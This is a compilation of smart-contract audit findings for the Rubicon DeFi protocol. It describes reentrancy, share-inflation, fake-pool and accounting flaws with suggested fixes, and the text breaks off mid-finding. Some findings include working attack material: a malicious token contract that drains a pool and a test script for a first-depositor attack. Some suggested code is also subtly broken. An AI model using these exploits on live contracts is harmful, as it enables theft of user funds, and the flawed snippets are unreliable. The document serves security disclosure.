# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101   # Vulnerability details   The function setBonusToken allows the same BonusToken to be added more than once to the array bonusTokens.  ```   function setBonusToken(address newBonusERC20) external onlyBathHouse {     bonusTokens.push(newBonusERC20);   } ```  ## Impact If that happens, early withdrawers can get Bonus in multiples of what they actually have right to. Late withdrawers, might not get any Bonus due to shortage.  ## Proof of Concept BathToken.sol, function setBonusToken https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270-L272 1. function setBonusToken allows the same BonusToken to be added more than once to the array.  BathToken.sol, function distributeBonusTokenRewards https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629 2. a. As and when distributeBonusTokenRewards is triggered during a withdraw call, the same bonusToken will be released more than once.  BathBuddy.sol, function release https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101 2. b. The release function is called.  ## Tools Used Manual review  ## Recommended Mitigation Steps   Add the required validations to avoid duplicate additions of bonus tokens.  ```   function setBonusToken(address newBonusERC20) external onlyBathHouse {     require(newBonusERC20 != address(0), "invalid_addr");     if (bonusTokens.length > 0) {       for (uint256 index = 0; index < bonusTokens.length; index++) {         require (token != newBonusERC20, "token already exists")       }     }     bonusTokens.push(newBonusERC20);   } ```   
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L844 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L857 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L883 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L898 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L927 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L951   # Vulnerability details  ## RMT-02M: Multiple Unsafe Arithmetic Operations  | File | Lines | Type | | :- | :- | :- | | RubiconMarket.sol | [L844](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L844), [L857](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L857), [L883](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L883), [L898](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L898), [L927](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L927), [L951](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L951) | Mathematical Operations |  ### Description  The referenced lines all perform unsafe multiplications using the unitary denominations of either `1 ether` (`1e18`) or `10**9` (`1e9`), both of which can easily lead to overflows when used as a multiplier for large amounts of assets.  ### Impact  Purchasing and selling amounts will be improperly fulfilled as well as improperly tracked as "sold out" / "bought out".  ### Solution (Recommended Mitigation Steps)  We advise the codebase to make use of the `mul` operation exposed by the `DSMath` library already incorporated into the codebase to guarantee all operations are performed safely and cannot overflow.  ### PoC  Issue is deducible by inspecting the relevant lines referenced in the issue and making note of the raw multiplication (`*`) operations performed.  ### Tools  Manual inspection of the codebase.  
# Lines of code  https://github.com/RubiconDeFi/rubicon-protocol-v1/blob/master/contracts/rubiconPools/BathToken.sol#L569-L571   # Vulnerability details  ## Impact The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.  ## Proof of Concept In `BathToken.sol:569-571`, the allocation of shares is calculated as follows: ```js (totalSupply == 0) ? shares = assets : shares = (     assets.mul(totalSupply) ).div(_pool); ```  An early attacker can exploit this by: * Attacker calls `openBathTokenSpawnAndSignal()` with `initialLiquidityNew = 1`, creating a new bath token with `totalSupply = 1` * Attacker transfers a large amount of underlying tokens to the bath token contract, such as `1000000` * Using `deposit()`, a victim deposits an amount less than `1000000`, such as `1000`:     * `assets = 1000`     * `(assets * totalSupply) / _pool = (1000 * 1) / 1000000 = 0.001`, which would round down to `0`     * Thus, the victim receives no shares in return for his deposit  To avoid minting 0 shares, subsequent depositors have to deposit equal to or more than the amount transferred by the attacker. Otherwise, their deposits accrue to the attacker who holds the only share.  ```js it("Victim receives 0 shares", async () => {     // 1. Attacker deposits 1 testCoin first when creating the liquidity pool     const initialLiquidityNew = 1;     const initialLiquidityExistingBathToken = ethers.utils.parseUnits("100", decimals);          // Approve DAI and testCoin for bathHouseInstance     await testCoin.approve(bathHouseInstance.address, initialLiquidityNew, {         from: attacker,     });     await DAIInstance.approve(         bathHouseInstance.address,         initialLiquidityExistingBathToken,         { from: attacker }     );      // Call open creation function, attacker deposits only 1 testCoin     const desiredPairedAsset = await DAIInstance.address;     await bathHouseInstance.openBathTokenSpawnAndSignal(         await testCoin.address,         initialLiquidityNew,         desiredPairedAsset,         initialLiquidityExistingBathToken,         { from: attacker }     );          // Retrieve resulting bathToken address     const newbathTokenAddress = await bathHouseInstance.getBathTokenfromAsset(testCoin.address);     const _newBathToken = await BathToken.at(newbathTokenAddress);      // 2. Attacker deposits large amount of testCoin into liquidity pool     let attackerAmt = ethers.utils.parseUnits("1000000", decimals);     await testCoin.approve(newbathTokenAddress, attackerAmt, {from: attacker});     await testCoin.transfer(newbathTokenAddress, attackerAmt, {from: attacker});      // 3. Victim deposits a smaller amount of testCoin, receives 0 shares     // In this case, we use (1 million - 1) testCoin     let victimAmt = ethers.utils.parseUnits("999999", decimals);     await testCoin.approve(newbathTokenAddress, victimAmt, {from: victim});     await _newBathToken.deposit(victimAmt, victim, {from: victim});          assert.equal(await _newBathToken.balanceOf(victim), 0); }); ```  ## Recommended Mitigation Steps * [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution. * In `_deposit()`, ensure the number of shares to be minted is non-zero:   `require(shares != 0, "No shares minted");`    
# Lines of code  [RubiconRouter.sol#L475-L492](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L475-L492)   # Vulnerability details  ## Impact  In the ```withdrawForETH``` function in ```RubiconRouter.sol```, the ```targetPool``` may be any contract that implements the ```IBathToken``` interface and returns ```wethAddress``` as its underlying token. The ```withdrawnWETH``` amount could be set to the ```RubiconRouter.sol``` contract's WETH balance so that the contract's entire WETH balance is withdrawn, as long as the ```tagetPool``` does not transfer any WETH to ```RubiconRouter.sol```. The caller of the ```withdrawForETH``` function would then receive the withdraw amount.  ## Proof of Concept  ```     function withdrawForETH(uint256 shares, address targetPool)         external         payable         returns (uint256 withdrawnWETH)     {         IERC20 target = IBathToken(targetPool).underlyingToken();         require(target == ERC20(wethAddress), "target pool not weth pool");         require(             IBathToken(targetPool).balanceOf(msg.sender) >= shares,             "don't own enough shares"         );         IBathToken(targetPool).transferFrom(msg.sender, address(this), shares);         withdrawnWETH = IBathToken(targetPool).withdraw(shares);         WETH9(wethAddress).withdraw(withdrawnWETH);          //Send back withdrawn native eth to sender         msg.sender.transfer(withdrawnWETH);     } ```  1. Let ```shares``` be equal to the contracts WETH balance.  2. The malicious ```targetPool``` contract returns the ```wethAddress``` as the underlying token on [line 480](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L480).   3. ```targetPool``` returns the max uint256 value for its balanceOf function to pass the require condition on [line 483](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L483) for any value of shares.  4. The transferFrom on [line 486](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L486) does not have to do anything and its withdraw function should return the WETH balance of ```RubiconRouter.sol```.  5. The ```RubiconRouter.sol``` contract will then [withdraw ETH](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L488) equal to the ```withdrawWETH``` amount, which should be equal to the contract's WETH balance.  6. The caller of the ```withdrawForETH``` function receives the withdraw ETH without providing any WETH.   ## Recommended Mitigation Steps:  Check the contract's WETH balance before the caller is supposed to send the WETH and after the WETH is sent to confirm the contract has received enough WETH from the caller.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568   # Vulnerability details  `BathToken.sol#_deposit()` calculates the actual transferred amount by comparing the before and after balance, however, since there is no reentrancy guard on this function, there is a risk of re-entrancy attack to mint more shares.  Some token standards, such as ERC777, allow a callback to the source of the funds (the `from` address) before the balances are updated in `transferFrom()`. This callback could be used to re-enter the function and inflate the amount.  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568  ```solidity function _deposit(uint256 assets, address receiver)     internal     returns (uint256 shares) {     uint256 _pool = underlyingBalance();     uint256 _before = underlyingToken.balanceOf(address(this));      // **Assume caller is depositor**     underlyingToken.transferFrom(msg.sender, address(this), assets);     uint256 _after = underlyingToken.balanceOf(address(this));     assets = _after.sub(_before); // Additional check for deflationary tokens     ... ```  ### PoC  With a ERC777 token by using the ERC777TokensSender `tokensToSend` hook to re-enter the `deposit()` function.  Given:   -   `underlyingBalance()`: `100_000e18 XYZ`. -   `totalSupply`: `1e18`  The attacker can create a contracts with `tokensToSend()` function, then:  1.   `deposit(1)`     -   preBalance  = `100_000e18`;     -   `underlyingToken.transferFrom(msg.sender, address(this), 1)` 2. reenter using `tokensToSend` hook for the 2nd call: `deposit(1_000e18)`     -   preBalance  = `100_000e18`;     -   `underlyingToken.transferFrom(msg.sender, address(this), 1_000e18)`     -   postBalance = `101_000e18`;     -   assets (actualDepositAmount) = `101_000e18 - 100_000e18 = 1_000e18`;     -   mint `1000` shares; 3. continue with the first `deposit()` call:     -   `underlyingToken.transferFrom(msg.sender, address(this), 1)`     -   postBalance = `101_000e18 + 1`;     -   assets (actualDepositAmount) = `(101_000e18 + 1) - 100_000e18 = 1_000e18 + 1`;     -   mint `1000` shares;  As a result, with only `1 + 1_000e18` transferred to the contract, the attacker minted `2_000e18 XYZ` worth of shares.  ### Recommendation  Consider adding `nonReentrant` modifier from OZ's `ReentrancyGuard`.   
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L471-L473   # Vulnerability details  ```solidity     function isClosed() public pure returns (bool closed) {         return false;     } ```  > After close, no new buys are allowed.  Based on context and comments, when the market is closed, offers can only be cancelled (offer and buy will throw).   However, in the current implementation, `isClosed()` always returns `false`, so the checks on whether the market is closed will always pass. (E.g: `can_offer()`, `can_buy()`, etc)  And there is a storage variable called `stopped`, but it's never been used, which seems should be used for `isClosed`.  ### Recommendation  Change to:  ```solidity     function isClosed() public pure returns (bool closed) {         return stopped;     } ```  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214   # Vulnerability details  ## Title Malicious pools can be deployed through `BathHouse`  ## Impact Reentrancy in `BathToken.initialize()` can be exploited and this allows to create a pool which has a legitimate underlying token (even one for which a pool already exists), and has given full approval of underlying Token to an attacker. While this underlying token will differ from the one returned by  `BathHouse.getBathTokenfromAsset` for that Pool (since the returned token would be the malicious one which reentered `initialize`), the LPs could still deposit actual legitimate tokens to the pool since it is deployed from the BathHouse and has the same name as a legit pool, and loose their deposit to the attacker.  ## Proof of Concept Create a new pool calling `BathHouse.openBathTokenSpawnAndSignal()` and passing as `newBathTokenUnderlying` the address with the following malicious token:  ```solidity // SPDX-License-Identifier: BUSL-1.1  pragma solidity =0.7.6;  import "@openzeppelin/contracts/token/ERC20/ERC20.sol"; import "@openzeppelin/contracts/access/Ownable.sol"; import "../../contracts/rubiconPools/BathToken.sol";  contract fakeToken is ERC20("trueToken", "TRUE"), Ownable {      ERC20 trueToken;     address marketAddress;     uint256 counterApprove;     BathToken bathToken;      function setTrueToken(address _trueTokenAddress) onlyOwner {         trueToken = ERC20(_trueTokenAddress);     }      function setMarketAddress(address _marketAddress) onlyOwner {         marketAddress = _marketAddress;     }      function approve(address spender, uint256 amount) public virtual override returns (bool) {         if (counterApprove == 1) { //first approve is from bathHouse             bathToken = BathToken(msg.sender);             bathToken.initialize(trueToken, owner, owner);             attacked = false;         }         counterApprove++;         _approve(_msgSender(), spender, amount);         return true;     }      function setAndApproveMarket(address _market){         // sets legitimate market after malicious bathToken initialization         bathToken.setMarket(_market);         bathToken.approveMarket();     }      function emptyPool() onlyOwner {         // sends pool tokens to attacker         uint256 poolBalance = trueToken.balanceOf(address(bathToken));         trueToken.transferFrom(address(bathToken), owner, poolBalance);     } } ```  This reenters `BathToken.initialize()` and reassigns the bathHouse role to the fake token, which names itself as the legit token. Also the reentrant call reassigns the legit Token to `underlyingToken` so thet the pool actually contains the legit token, but gives infinite approval for the legit token from the pool to the attacker, who is passed as `market` in the reentrant call.  Since the fakeToken has the bathHouse role, it can set the market to the actual RubiconMarket after the reentrant call.  Code: [BathHouse.openBathTokenSpawnAndSignal](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153), [BathToken.initialize](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214)  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Add `onlyBathHouse` modifier to `initialize` function in `BathToken` to avoid reentrancy from malicious tokens.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L962   # Vulnerability details  ## Impact  In the `RubiconMarket` contract, buys can be disabled with `setBuyEnabled`. However, if `matchingEnabled` is set to `false`, buys can not be disabled as the `require` check is located in the `_buys` function instead of checking `buyEnabled` in the `buy` function.  ## Proof of Concept  [RubiconMarket.sol#L962](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L962)  ```solidity function _buys(uint256 id, uint256 amount) internal returns (bool) {     require(buyEnabled); // @audit-info Buys can not be disabled if offer matching is disabled - this require statement should be moved to `buy` function     if (amount == offers[id].pay_amt) {         if (isOfferSorted(id)) {             //offers[id] must be removed from sorted list because all of it is bought             _unsort(id);         } else {             _hide(id);         }     }      require(super.buy(id, amount));      // If offer has become dust during buy, we cancel it     if (         isActive(id) &&         offers[id].pay_amt < _dust[address(offers[id].pay_gem)]     ) {         dustId = id; //enable current msg.sender to call cancel(id)         cancel(id);     }     return true; } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Move the `require` check for `buyEnabled` to the `buy` function [here](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L662).  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L251   # Vulnerability details  ## Impact  It is a good idea to add a `require()` statement that checks the return value of ERC20 token transfers or to use something like OpenZeppelin’s `safeTransfer()`/`safeTransferFrom()` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.  However, using `require()` to check transfer return values could lead to issues with non-compliant ERC20 tokens which do not return a boolean value. Therefore, it's highly advised to use OpenZeppelin’s `safeTransfer()`/`safeTransferFrom()`.  ## Proof of Concept  **RubiconRouter.sol**  [L251](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L251): `ERC20(route[route.length - 1]).transfer(to, currentAmount);`\ [L303](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L303): `ERC20(buy_gem).transfer(msg.sender, fill);`\ [L320](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L320): `ERC20(buy_gem).transfer(msg.sender, fill);`\ [L348](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L348): `ERC20(buy_gem).transfer(msg.sender, buy_amt);`\ [L377](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L377): `ERC20(pay_gem).transfer(msg.sender, max_fill_amount - fill);`\ [L406](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L406): `ERC20(buy_gem).transfer(msg.sender, _after - _before);`\ [L471](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L471): `ERC20(targetPool).transfer(msg.sender, newShares);`  **peripheral_contracts/BathBuddy.sol**  [L114](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L114): `token.transfer(recipient, amountWithdrawn);`  **rubiconPools/BathPair.sol**  [L601](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L601): `IERC20(asset).transfer(msg.sender, booty);`\ [L615](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L615): `IERC20(quote).transfer(msg.sender, booty);`  **rubiconPools/BathToken.sol**  [L353](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L353): `IERC20(filledAssetToRebalance).transfer(`\ [L357](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L357): `IERC20(filledAssetToRebalance).transfer(msg.sender, stratReward); `\ [L602](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L602): `underlyingToken.transfer(feeTo, _fee);`\ [L605](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L605): `underlyingToken.transfer(receiver, amountWithdrawn);`  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider using `safeTransfer()`/`safeTransferFrom()` instead of `transfer()`/`transferFrom()`.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L114   # Vulnerability details  ## Impact If a token with callback capabilities is used as a token to vested, then a malicious beneficiary may get the vested amount back without waiting for the vesting period.  ## Proof of Concept  In the function release, line (<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87>), there’s no modifier to stop reentrancy, in the other contracts it would be the synchronized modifier. If a token could reenter with a hook in a malicious contract (an ERC777 token, for example, which is backwards compatible with ERC20), released token counter array (<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L116>) wouldn’t be updated, enabling the withdrawal of the vested amount before the vesting period ends. A plausible scenario would be:  1) A malicious beneficiary contract B calls the release() function with itself as the recipient, everything goes according to the function, and transfer and callback to the malicious beneficiary contract happens.  2) Contract B contains tokensReceived(), a function in the ERC777 token that allows for callback to the victim contract as you can see here https://twitter.com/transmissions11/status/1496944873760428058/ (This function also can be any function that is analogous to a fallback function that might be implemented in a modified ERC20. As it can be seen, any token that would give the attacker control over the execution flow will suffice.)  3) Inside the tokensReceived() function, a call is made back to the release function.  5) This steps are repeated until vested amount is taken back.  4) This allows for the malicious beneficiary contract to redeem the vested amount while bypassing the vesting period, due to the released token counter array (https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L116) which controls how many tokens are released (https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L101) being updated only after the transferring of all tokens occurs. As this is the case, malicious beneficiary  can get the usual amount that they could withdraw at the time indefinite amount of times (as result of released in line 101 will be 0), thus approximately getting all of their vested amount back without waiting for the vesting period. (fees not included).    There's also precedents of similar bugs that reported, as seen here: https://github.com/code-423n4/2022-01-behodler-findings/issues/154#issuecomment-1029448627   ## Tools used Manual code review, talks with dev  ## Recommended Mitigations Steps 1) Consider adding a mutex such as nonReentrant, or the synchronized modifier used in the other contracts.  2) Implement checks-effects-interactions pattern.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L290 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L307   # Vulnerability details  ## Impact The two functions maxSellAllAmount and maxBuyAllAmount will always revert in case at least (100-fee)\% of user's balance can be matched with orders.    ## Proof of Concept Let say Bob placed an order selling 100 USDC with a low USDT price of 1:0.95.  Alice currently has 50 USDT and they want to maxSellAllAmount into USDC.   The function will pass 50 as amount into RubiconMarket's buyAll function where it fully matches with Bob's order. Here, the buy() function will first transfer alice's 50 USDT in and later 50 * feeBPS / BPS as fee. In this case, alice can not afford to pay.   Therefore, the two functions maxSellAllAmount and maxBuyAllAmount are useless in case user's request can be fully matched.  ## Recommended Mitigation Steps  Add the fee calculating before passing the amount to the RubiconMarket's buyAll, sellAll function.   ```solidity     /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust     function maxBuyAllAmount(         ERC20 buy_gem,         ERC20 pay_gem,         uint256 max_fill_amount     ) external returns (uint256 fill) {         //swaps msg.sender's entire balance in the trade                     uint256 maxAmount = _calcAmountAfterFee(ERC20(buy_gem).balanceOf(msg.sender));                  fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(             buy_gem,             maxAmount,             pay_gem,             max_fill_amount         );         ERC20(buy_gem).transfer(msg.sender, fill);     }      /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust     function maxSellAllAmount(         ERC20 pay_gem,         ERC20 buy_gem,         uint256 min_fill_amount     ) external returns (uint256 fill) {         //swaps msg.sender entire balance in the trade          uint256 maxAmount = _calcAmountAfterFee(ERC20(buy_gem).balanceOf(msg.sender));         fill = RubiconMarket(RubiconMarketAddress).sellAllAmount(             pay_gem,             maxAmount,             buy_gem,             min_fill_amount         );         ERC20(buy_gem).transfer(msg.sender, fill);     }       function _calcAmountAfterFee(uint256 amount) internal view returns (uint256) {         uint256 feeBPS = RubiconMarket(RubiconMarketAddress).getFeeBPS();         return amount.sub(amount.mul(feeBPS).div(10000));     } ```    
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L103-L104 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L133   # Vulnerability details   ## Impact  When a whale withdraws their tokens and receives rewards from the `BathBuddy` contract the fees they pay will erroneously become part of the calculation performed in function `vestedAmount`. This means that any subsequent withdrawer of funds may receive a disproportionate amount of tokens. The fees paid by a whale could still be much larger than the amount of tokens invested by a minnow.  Althought similar to the issue "When `BathToken` contract is recipient of fees then users can make disproportionate returns after whales withdraw" it is not the same issue since fees are always accrued in the `BathBuddy` contract and this cannot be changed. Also, the calculations in are subtly different  However, the outcome is the same. A minnow can receive a disproportionate reward and drain much of the fees from the contract.  The intention of setting the pool as the recipient of the fees was to reward HODLers but, in fact, they will be incentivised to withdraw after a whale does.  ## Proof of Concept  Consider the following scenario.  1. fee is set to 50 BPS (i.e. 0.50%) 2. A whale deposits 200 tokens 3. A minnow deposits 0.01 tokens 4. A `BathBuddy` contract is set up for the `BathToken` contract. 5. The whale withdraws their funds 6. The minnow then withdraws their funds  After step 5, the function `vestedAmount` will return a value that includes the fees paid by the whale. This is because the `BathBuddy` contract is the recipient of all fees. They are not transferred anywhere.  Thus, when the minnow withdraws their funds `releasable` is much larger than the amount they otherwise would have expected. Further [sharesWithdrawn](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L103) is equal to [initialTotalSupply](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L104) in this particular scenario so `mul(sharesWithdrawn).div(initialTotalSupply)` evaluates to `1`. This means that `amount = releaseable`.  A [test](https://github.com/sseefried/codearena-rubicon-2022-05/blob/f5010d845d3713b07a00f3bb96a5608c6d09b047/test/BugsBathBuddy.js#L55-L145) has been written in the private fork that exhibits this behaviour.  ## Tools Used  Manual inspection  ## Recommended Mitigation Steps  Keep a tally of the fees accrued in a separate variable and work out a fairer system for distributing rewards to HODLers.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/tree/main/contracts/rubiconPools/BathPair.sol#L591-L625   # Vulnerability details  ## Impact Strategists can take more rewards than they should using the function strategistBootyClaim(). Even though the owner trusts strategists fully I think it's recommended to remove such flaws. I think there would be 2 methods to claim more rewards.   ## Proof of Concept Method 1. A strategist can call the function using same asset/quote parameters. Then both of fillCountA and fillCountQ will be same positive values. The first code block for fillCountA(L597-L610) will work same as expected but the second block for fillCountQ(L611-L624) will be executed for the same asset again. Two mappings(totalFillsPerAsset, strategist2Fills) that save rewards will be updated for asset already after the first block  but totalFillsPerAsset and balance of this contract for quote would be still positive as there would be remaining rewards for other strategiets. So the strategist can get paid once more for the same asset.  Method 2. I think a reentrancy attack is possible also because two mappings are updated after transfer funds.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps For Method 1. You can add this require() at the beginning of function.(L595) require(asset != quote, "asset = quote");  For Method 2. You can update the state of 2 mappings before transfer. Move L608-L609 to L601 Move L622-L623 to L615  So final code will look like this.(pseudocode)  function strategistBootyClaim(address asset, address quote)     external     onlyApprovedStrategist(msg.sender) {     require(asset != quote, "asset = quote");      uint256 fillCountA = strategist2Fills[msg.sender][asset];     uint256 fillCountQ = strategist2Fills[msg.sender][quote];     if (fillCountA > 0) {         uint256 booty = (             fillCountA.mul(IERC20(asset).balanceOf(address(this)))         ).div(totalFillsPerAsset[asset]);          totalFillsPerAsset[asset] -= fillCountA;         strategist2Fills[msg.sender][asset] -= fillCountA;          IERC20(asset).transfer(msg.sender, booty);         emit LogStrategistRewardClaim(             msg.sender,             asset,             booty,             block.timestamp         );     }     if (fillCountQ > 0) {         uint256 booty = (             fillCountQ.mul(IERC20(quote).balanceOf(address(this)))         ).div(totalFillsPerAsset[quote]);          totalFillsPerAsset[quote] -= fillCountQ;         strategist2Fills[msg.sender][quote] -= fillCountQ;          IERC20(quote).transfer(msg.sender, booty);         emit LogStrategistRewardClaim(             msg.sender,             quote,             booty,             block.timestamp         );     } }  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L499   # Vulnerability details  The fee is wrongly accounted for in `previewWithdraw`.  ## Impact Function returns wrong result; Additionally, `withdraw(assets,to,from)` will always revert. (The user can still withdraw his assets via other functions).  ## Proof of Concept The `previewWithdraw` function returns *less* shares than the required assets (notice the substraction): ```             uint256 amountWithdrawn;             uint256 _fee = assets.mul(feeBPS).div(10000);             amountWithdrawn = assets.sub(_fee);             shares = convertToShares(amountWithdrawn); ``` This won't work, because if the user wants to receive amount of `assets`, he needs to burn *more* shares than that to account for the fee. Not less. This will also make `withdraw(assets,to,from)` [revert](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L514:#L519), because it takes the amount of shares from `previewWithdraw`, and then checks how much assets were really sent to the user, and verifies that it's at least how much he asked for: ```         uint256 expectedShares = previewWithdraw(assets);         uint256 assetsReceived = _withdraw(expectedShares, receiver);         require(assetsReceived >= assets, "You cannot withdraw the amount of assets you expected"); ``` But since the expectedShares is smaller than the original amount, and since `_withdraw` [deducts](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L604) the fee from expectedShares, then always 